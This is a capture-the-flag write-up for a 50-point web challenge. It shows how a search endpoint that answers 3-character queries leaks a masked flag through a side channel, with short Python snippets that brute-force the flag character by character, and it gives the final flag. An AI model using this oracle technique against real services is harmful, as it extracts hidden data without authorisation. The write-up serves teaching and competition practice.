# Flag L3ak

## Challenge Summary

- **Category**: Web  
- **Points**: 50  
- **Solves**: 698 teams  

---

### Description

> What's the name of this CTF? Yk what to do 😉

---

## Challenge Structure

- A blog-style web service
- Two main endpoints: `/api/posts` and `/api/search`
- Some posts contain the actual FLAG, but the value is masked in the response

---

## Exploitation Flow

### Step 1: Identify Side-channel via Search Results

- The `/api/search` endpoint returns posts if the 3-character query string exists in the `title`, `content`, or `author` fields.
- If the query is not exactly 3 characters, the server returns `400 Bad Request`.
- Even though the FLAG is masked, the presence of a post titled `"Not the flag?"` indirectly reveals whether the search string matches part of the FLAG.

```python
def is_valid_flag(flag):
    r = requests.post(URL, json={"query": flag})
    return "Not the flag?" in r.text
```

---

### Step 2: Sliding-window Brute-force Strategy

- Start with the known FLAG prefix `L3AK{`
- For each new character, send a 3-character sliding window:
  - Last 2 characters of the current FLAG + candidate character
- If the `"Not the flag?"` post is returned, we confirm the candidate is part of the FLAG.

```python
for c in string.printable:
    trial = flag[-2:] + c
    if is_valid_flag(trial):
        flag += c
        break
```

---

### Step 3: Loop Until Complete FLAG

- Continue brute-forcing until `}` is found, marking the end of the FLAG.

```python
flag = "L3AK{"
while "}" not in flag:
    # Brute-force loop
```

---

## Final FLAG

```
L3AK{L3ak1ng_th3_Fl4g??}
```
